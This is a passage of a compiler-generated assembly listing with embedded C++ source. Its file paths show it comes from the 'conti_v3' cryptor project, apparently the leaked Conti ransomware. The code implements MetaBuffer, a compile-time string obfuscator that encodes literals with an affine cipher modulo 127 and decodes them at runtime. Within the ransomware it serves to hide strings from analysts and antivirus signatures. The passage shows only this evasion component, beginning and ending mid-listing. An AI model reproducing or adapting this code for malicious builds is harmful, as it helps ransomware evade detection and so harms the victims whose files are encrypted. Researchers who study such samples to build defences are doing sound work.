	00 00		 mov	 rax, QWORD PTR this$[rbp]
  012fa	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  01301	5f		 pop	 rdi
  01302	5d		 pop	 rbp
  01303	c3		 ret	 0
??0?$MetaBuffer@$0GB@$0CP@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@$0FA@$0FB@$0FC@$0FD@$0FE@$0FF@$0FG@$0FH@$0FI@$0FJ@$0FK@$0FL@$0FM@$0FN@$0FO@$0FP@$0GA@$0GB@$0GC@$0GD@$0GE@$0GF@$0GG@$0GH@$0GI@$0GJ@$0GK@$0GL@$0GM@$0GN@$0GO@$0GP@$0HA@$0HB@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >::MetaBuffer<97,47,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 26	 sub	 eax, 38			; 00000026H
  0002d	6b c0 19	 imul	 eax, eax, 25
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z PROC ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 3d	 imul	 eax, eax, 61		; 0000003dH
  0002d	83 c0 26	 add	 eax, 38			; 00000026H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 16	 cmp	 QWORD PTR i$1[rbp], 22
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ PROC ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv252 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0009d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  000a2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000a9	88 41 03	 mov	 BYTE PTR [rcx+3], al
  000ac	b8 01 00 00 00	 mov	 eax, 1
  000b1	48 6b c0 03	 imul	 rax, rax, 3
  000b5	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000bc	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000c7	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  000cc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000d3	88 41 04	 mov	 BYTE PTR [rcx+4], al
  000d6	b8 01 00 00 00	 mov	 eax, 1
  000db	48 6b c0 04	 imul	 rax, rax, 4
  000df	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  000e6	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  000ea	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000f1	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  000f6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  000fd	88 41 05	 mov	 BYTE PTR [rcx+5], al
  00100	b8 01 00 00 00	 mov	 eax, 1
  00105	48 6b c0 05	 imul	 rax, rax, 5
  00109	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00110	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00114	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0011b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00120	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00127	88 41 06	 mov	 BYTE PTR [rcx+6], al
  0012a	b8 01 00 00 00	 mov	 eax, 1
  0012f	48 6b c0 06	 imul	 rax, rax, 6
  00133	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0013a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0013e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00145	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0014a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00151	88 41 07	 mov	 BYTE PTR [rcx+7], al
  00154	b8 01 00 00 00	 mov	 eax, 1
  00159	48 6b c0 07	 imul	 rax, rax, 7
  0015d	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00164	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00168	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0016f	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00174	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0DN@$0CG@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<61,38,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
